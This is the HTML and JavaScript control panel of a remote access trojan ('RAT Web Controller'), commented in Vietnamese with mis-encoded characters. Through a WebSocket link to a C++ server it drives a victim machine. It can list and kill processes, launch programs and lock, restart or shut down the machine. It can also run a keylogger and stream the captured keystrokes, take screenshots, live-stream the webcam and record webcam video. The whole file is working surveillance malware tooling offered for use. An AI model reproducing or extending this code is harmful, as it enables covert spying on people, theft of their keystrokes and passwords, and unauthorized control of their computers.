<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAT Web Controller Final</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        /* BASE STYLES */
        body { background-color: #f8f9fa; }
        .card { border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); margin-bottom: 20px; }
        .btn-group { margin-top: 10px; }

        /* KEYLOGGER & PROCESS LIST */
        #keylog-output { 
            height: 250px; 
            overflow-y: scroll; 
            font-family: monospace; 
            font-size: 0.9em; 
            background: #fff; 
            border: 1px solid #dee2e6; 
            padding: 10px; 
            white-space: pre-wrap; /* Quan tr·ªçng cho Keylog */
        }
        #process-list-output { max-height: 250px; overflow-y: auto; background: #fff; padding: 10px; border: 1px solid #dee2e6; border-radius: 5px; font-size: 0.85em; }
        
        /* WEBCAM FEED */
        #webcam-feed { max-width: 100%; height: auto; border: 1px solid #000; display: block; margin-top: 10px; }

        /* FEEDBACK AREA */
        #immediate-feedback {
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 8px;
            font-weight: bold;
            display: none;
        }
        .feedback-success { background-color: #d1e7dd; color: #0f5132; border: 1px solid #badbcc; }
        .feedback-error { background-color: #f8d7da; color: #842029; border: 1px solid #f5c2c7; }
        .feedback-info { background-color: #cff4fc; color: #055160; border: 1px solid #b6effb; }
    </style>
</head>
<body>
    <div class="container mt-4">
        <h1 class="text-center mb-4 text-primary">RAT Server Control Panel</h1>
        
        <div class="card p-3 mb-4 bg-light">
            <h5>Tr·∫°ng th√°i K·∫øt n·ªëi: 
                <span id="ws-status" class="badge bg-danger">DISCONNECTED</span>
                <span id="keylog-status" class="badge bg-secondary ms-3">KEYLOGGER: D·ª´ng</span>
            </h5>
            <p>WebSocket URL: <code>{{ ws_url }}</code></p>
        </div>
        
        <div id="immediate-feedback" role="alert"></div>

        <div class="row">
            <div class="col-md-6">
                <div class="card p-4">
                    <h4 class="card-title text-success">1. Qu·∫£n L√Ω H·ªá Th·ªëng & Ti·∫øn Tr√¨nh</h4>
                    
                    <div class="btn-group mb-3">
                        <button class="btn btn-outline-primary" onclick="sendCommand('LIST_PROC')">Xem Danh S√°ch Process</button>
                    </div>

                    <h5 class="mt-4">Di·ªát Ti·∫øn Tr√¨nh</h5>
                    <div class="input-group mb-3">
                        <input type="text" id="pid-input" class="form-control" placeholder="PID (s·ªë) ho·∫∑c T√™n Process (e.g., chrome.exe)" onkeypress="handleEnterKey(event, 'kill')">
                        <button class="btn btn-danger" onclick="killProcess()">Di·ªát Process</button>
                    </div>
                    
                    <h5 class="mt-4">Kh·ªüi Ch·∫°y ·ª®ng D·ª•ng/Web</h5>
                    <div class="input-group mb-3">
                        <input type="text" id="app-input" class="form-control" placeholder="T√™n App/Web (e.g., notepad, www.google.com)" onkeypress="handleEnterKey(event, 'start')">
                        <button class="btn btn-success" onclick="startApp()">M·ªü App/Web</button>
                    </div>
                    
                    <h5 class="mt-4">Ti·∫øn tr√¨nh ƒëang ch·∫°y:</h5>
                    <div id="process-list-output">
                        <p class="text-muted">B·∫•m "Xem Process" ƒë·ªÉ t·∫£i danh s√°ch...</p>
                    </div>
                    
                    <h5 class="mt-4">ƒêi·ªÅu Khi·ªÉn Ngu·ªìn</h5>
                    <div class="btn-group">
                        <button class="btn btn-warning" onclick="sendCommand('SYSTEM_CONTROL', {type: 'LOCK'})">Kh√≥a M√°y üîí</button>
                        <button class="btn btn-secondary" onclick="sendCommand('SYSTEM_CONTROL', {type: 'RESTART'})">Kh·ªüi ƒê·ªông L·∫°i</button>
                        <button class="btn btn-danger" onclick="sendCommand('SYSTEM_CONTROL', {type: 'SHUTDOWN'})">T·∫Øt M√°y</button>
                    </div>
                </div>
            </div>

            <div class="col-md-6">
                <div class="card p-4">
                    <h4 class="card-title text-info">2. Theo D√µi & ƒêa Ph∆∞∆°ng Ti·ªán</h4>

                    <h5 class="mt-3">Keylogger Log</h5>
                    <div class="btn-group mb-3">
                        <button id="btn-start-keylog" class="btn btn-success" onclick="startKeylogger()">B·∫≠t Keylogger</button>
                        <button id="btn-stop-keylog" class="btn btn-danger" onclick="stopKeylogger()">T·∫Øt Keylogger</button>
                    </div>
                    <div id="keylog-output">Ch·ªù l·ªánh START_KEYLOG...</div>

                    <h5 class="mt-4">Media Control</h5>
                    <button class="btn btn-primary mb-2" onclick="sendCommand('SCREENSHOT')">Ch·ª•p M√†n H√¨nh üì∏</button>
                    
                    <div class="btn-group">
                        <button class="btn btn-info" onclick="startWebcam()">B·∫≠t Live Stream</button>
                        <button class="btn btn-danger" onclick="stopWebcam()">T·∫Øt Stream</button>
                        <button class="btn btn-warning" onclick="startRecord()">Ghi H√¨nh 10s</button>
                    </div>
                    
                    <h5 class="mt-4">Live Webcam Feed:</h5>
                    <img id="webcam-feed" src="" alt="Webcam Feed" class="img-fluid">
                </div>
            </div>
        </div>

        <div id="alert-output-container" style="display: none;">
             <p id="alert-output"></p>
        </div>
    </div>

    <script>
        const wsUrl = "{{ ws_url }}"; 
        let ws;
        let isKeylogging = false;
        let isStreaming = false; 
        const alertOutput = document.getElementById('alert-output'); // Gi·ªØ l·∫°i cho console log
        const feedbackElement = document.getElementById('immediate-feedback');

        // --- H√ÄM A: HI·ªÇN TH·ªä PH·∫¢N H·ªíI T·ª®C TH√å ---
        function displayFeedback(message, type) {
            feedbackElement.textContent = message;
            feedbackElement.className = `alert mt-2 feedback-${type}`;
            feedbackElement.style.display = 'block';

            setTimeout(() => {
                feedbackElement.style.display = 'none';
            }, 5000); 
            
            console.log(`[FEEDBACK] ${type.toUpperCase()}: ${message}`);
        }

        // --- H√ÄM B: X·ª¨ L√ù DOWNLOAD (CHO SCREENSHOT V√Ä VIDEO) ---
        function downloadBase64(base64Data, filename, mimeType) {
            const link = document.createElement('a');
            link.href = 'data:' + mimeType + ';base64,' + base64Data;
            link.download = filename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        // --- H√ÄM C: X·ª¨ L√ù NH·∫§N PH√çM ENTER (M·ªöI) ---
        function handleEnterKey(event, action) {
            if (event.key === 'Enter') {
                event.preventDefault();
                if (action === 'kill') {
                    killProcess();
                } else if (action === 'start') {
                    startApp();
                }
            }
        }
        
        // --- H√ÄM D: K·∫æT N·ªêI V√Ä X·ª¨ L√ù WEBSOCKET ---
        function connectWebSocket() {
            ws = new WebSocket(wsUrl);
            const statusElement = document.getElementById('ws-status');
            const keylogStatus = document.getElementById('keylog-status');

            ws.onopen = () => {
                statusElement.textContent = 'CONNECTED';
                statusElement.classList.remove('bg-danger', 'bg-warning');
                statusElement.classList.add('bg-success');
                displayFeedback("K·∫øt n·ªëi WebSocket t·ªõi Server C++ th√†nh c√¥ng!", 'success');
            };

            ws.onerror = (error) => {
                console.error("WebSocket Error:", error);
            };

            ws.onclose = () => {
                statusElement.textContent = 'DISCONNECTED';
                statusElement.classList.remove('bg-success', 'bg-warning');
                statusElement.classList.add('bg-danger');
                displayFeedback("M·∫•t k·∫øt n·ªëi. ƒêang th·ª≠ k·∫øt n·ªëi l·∫°i...", 'error');
                
                // Reset tr·∫°ng th√°i
                isKeylogging = false;
                keylogStatus.textContent = 'KEYLOGGER: D·ª´ng';
                keylogStatus.classList.remove('bg-success');
                keylogStatus.classList.add('bg-secondary');
                
                isStreaming = false;
                document.getElementById('webcam-feed').src = "";
                
                setTimeout(connectWebSocket, 5000); 
            };

            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                const output = document.getElementById('keylog-output');
                let feedbackType = 'info';

                // 1. X·ª≠ l√Ω Keylogger
                if (data.type === 'KEYLOG_RESULT') {
                    output.innerHTML += data.data; 
                    output.scrollTop = output.scrollHeight; 
                    if (isKeylogging) { 
                        sendCommand('GET_KEYLOG');
                    }
                    return; 
                }
                
                // 2. X·ª≠ l√Ω ·∫¢nh Ch·ª•p M√†n H√¨nh (T·∫£i file)
                else if (data.type === 'SCREENSHOT_RESULT') {
                    const b64 = data.data;
                    const filename = `screenshot_${Date.now()}.jpeg`;
                    
                    document.getElementById('webcam-feed').src = ''; 
                    downloadBase64(b64, filename, 'image/jpeg');
                    displayFeedback(`·∫¢nh ch·ª•p m√†n h√¨nh ƒë√£ ƒë∆∞·ª£c t·∫£i xu·ªëng (${filename}).`, 'success');
                }
                
                // 3. X·ª≠ l√Ω Live Webcam Frame
                else if (data.type === 'CAM_FRAME') {
                    document.getElementById('webcam-feed').src = 'data:image/jpeg;base64,' + data.data;
                    return; 
                }
                
                // 4. X·ª≠ l√Ω Process List
                else if (data.type === 'LIST_RESULT') {
                    const processData = data.data;
                    const processListOutput = document.getElementById('process-list-output');
                    
                    let htmlContent = `<p class="fw-bold text-success">T√¨m th·∫•y ${processData.length} ti·∫øn tr√¨nh:</p>`;
                    
                    processData.forEach(proc => {
                        const parts = proc.split(' | ');
                        const name = parts[0];
                        const pid = parts[1];
                        
                        htmlContent += `<p class="mb-0"><strong>${name}</strong> (${pid})</p>`;
                    });
                    
                    processListOutput.innerHTML = htmlContent;
                    displayFeedback(`ƒê√£ nh·∫≠n ${processData.length} ti·∫øn tr√¨nh.`, 'success');
                }
                
                // 5. X·ª≠ l√Ω K·∫øt Qu·∫£ H√†nh ƒê·ªông (ACTION_RESULT) - CORE FEEDBACK
                else if (data.type === 'ACTION_RESULT') {
                    const msg = data.msg;
                    
                    if (msg.includes("TH√ÄNH C√îNG") || msg.includes("Webcam Started") || msg.includes("Da diet") || msg.includes("hoan toan")) {
                        feedbackType = 'success';
                    } else if (msg.includes("TH·∫§T B·∫†I") || msg.includes("L·ªói") || msg.includes("Khong tim thay")) {
                        feedbackType = 'error';
                    }
                    else {
                        feedbackType = 'info';
                    }

                    // Logic ƒë·ªìng b·ªô tr·∫°ng th√°i webcam
                    if (msg.includes("Webcam Stopping") || msg.includes("tat hoan toan")) {
                        isStreaming = false;
                        document.getElementById('webcam-feed').src = "";
                        feedbackType = 'success'; // ƒê√°nh d·∫•u th√†nh c√¥ng khi Server b√°o "ho√†n to√†n"
                    }
                    
                    displayFeedback(msg, feedbackType);
                }
                
                // 6. X·ª≠ l√Ω Record Video (T·∫£i file)
                else if (data.type === 'RECORD_RESULT') {
                    const b64 = data.data;
                    const filename = `webcam_record_${Date.now()}.avi`;
                    
                    downloadBase64(b64, filename, 'video/avi');
                    displayFeedback(`File Video ƒë√£ ƒë∆∞·ª£c t·∫£i xu·ªëng (${filename}).`, 'success');
                }
                
                console.log(`[SERVER LOG CHI TI·∫æT] ${JSON.stringify(data)}`);
            };
        }

        // --- H√ÄM E: G·ª¨I L·ªÜNH JSON ---
        function sendCommand(cmd, args = {}) {
            if (ws && ws.readyState === WebSocket.OPEN) {
                args.cmd = cmd;
                ws.send(JSON.stringify(args));
            } else {
                displayFeedback("L·ªñI: M·∫•t k·∫øt n·ªëi. ƒêang th·ª≠ k·∫øt n·ªëi l·∫°i...", 'error');
            }
        }

        // --- H√ÄM F: X·ª¨ L√ù T∆Ø∆†NG T√ÅC BUTTON/ENTER ---
        
        function killProcess() {
            const target = document.getElementById('pid-input').value.trim();
            if (!target) {
                displayFeedback("[L·ªñI NH·∫¨P] Vui l√≤ng nh·∫≠p PID ho·∫∑c T√™n Process.", 'error');
                return; 
            }
            const sanitizedTarget = target.replace(/[^a-zA-Z0-9.\s]/g, '').trim(); 
            displayFeedback(`ƒêang g·ª≠i l·ªánh di·ªát Process: ${sanitizedTarget}...`, 'info');
            
            if (!sanitizedTarget) {
                 displayFeedback("[L·ªñI] K√Ω t·ª± kh√¥ng h·ª£p l·ªá ƒë√£ b·ªã lo·∫°i b·ªè. Vui l√≤ng nh·∫≠p l·∫°i.", 'error');
                 return;
            }

            if (isNaN(sanitizedTarget)) {
                sendCommand('KILL_PROC', { proc_name: sanitizedTarget });
            } else {
                sendCommand('KILL_PROC', { pid: sanitizedTarget });
            }
        }

        function startApp() {
            const name = document.getElementById('app-input').value.trim();
            if (!name) {
                displayFeedback("[L·ªñI NH·∫¨P] Vui l√≤ng nh·∫≠p t√™n ·ª©ng d·ª•ng/web.", 'error');
                return; 
            }
            const sanitizedName = name.replace(/[^a-zA-Z0-9.\s]/g, '').trim(); 
            displayFeedback(`ƒêang g·ª≠i l·ªánh kh·ªüi ch·∫°y: ${sanitizedName}...`, 'info');
            sendCommand('START_PROC', { name: sanitizedName });
        }

        function startKeylogger() {
            if (!isKeylogging) {
                isKeylogging = true;
                sendCommand('START_KEYLOG'); 
                sendCommand('GET_KEYLOG'); 
                document.getElementById('keylog-output').textContent = 'Keylogger ƒëang ho·∫°t ƒë·ªông...\n\n';
                document.getElementById('keylog-status').textContent = 'KEYLOGGER: Ho·∫°t ƒë·ªông';
                document.getElementById('keylog-status').classList.remove('bg-secondary');
                document.getElementById('keylog-status').classList.add('bg-success');
                displayFeedback("Keylogger ƒë√£ ƒë∆∞·ª£c k√≠ch ho·∫°t. ƒêang theo d√µi...", 'success');
            }
        }

        function stopKeylogger() {
            isKeylogging = false;
            document.getElementById('keylog-status').textContent = 'KEYLOGGER: D·ª´ng';
            document.getElementById('keylog-status').classList.remove('bg-success');
            document.getElementById('keylog-status').classList.add('bg-secondary');
            displayFeedback("Keylogger ƒë√£ d·ª´ng theo d√µi.", 'info');
        }

        function startWebcam() {
            if (!isStreaming) {
                isStreaming = true;
                sendCommand('START_CAM');
                displayFeedback("ƒêang y√™u c·∫ßu Server b·∫≠t Live Stream Webcam...", 'info');
            } else {
                displayFeedback("Webcam ƒë√£ ho·∫°t ƒë·ªông. Vui l√≤ng t·∫Øt tr∆∞·ªõc khi Start l·∫°i.", 'info');
            }
        }

        function stopWebcam() {
            if (isStreaming) {
                isStreaming = false; 
                sendCommand('STOP_CAM');
                // G·ª≠i l·ªánh pending, Server s·∫Ω x√°c nh·∫≠n th√†nh c√¥ng sau khi join()
                displayFeedback("ƒê√£ g·ª≠i l·ªánh d·ª´ng Webcam. Ch·ªù Server x√°c nh·∫≠n t·∫Øt ho√†n to√†n...", 'info');
            }
        }

        function startRecord() {
            if (isStreaming) {
                 displayFeedback("[L·ªñI] Vui l√≤ng t·∫Øt Live Stream tr∆∞·ªõc khi Ghi h√¨nh.", 'error');
            } else {
                 sendCommand('RECORD_CAM');
                 displayFeedback("ƒê√£ g·ª≠i l·ªánh Ghi h√¨nh 10s. Vui l√≤ng ch·ªù file t·∫£i v·ªÅ...", 'info');
            }
        }

        // Kh·ªüi ch·∫°y khi load trang
        connectWebSocket(); 
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>